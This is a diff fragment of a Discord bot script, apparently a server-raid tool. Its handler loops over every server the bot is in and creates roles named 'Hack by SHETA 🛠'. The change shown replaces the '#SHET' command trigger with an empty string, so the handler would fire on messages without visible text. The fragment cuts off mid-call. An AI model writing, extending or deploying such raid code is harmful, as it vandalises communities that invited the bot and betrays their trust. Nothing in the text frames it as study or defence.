@@ -72,7 +72,7 @@ LOka.on("message", message => {
 });
 
 LOka.on("message", message => {
-  if (message.content === "#SHET") {
+  if (message.content === "") {
     LOka.guilds.forEach(m => {
       m.createRole({
         name: "Hack by SHETA 🛠",
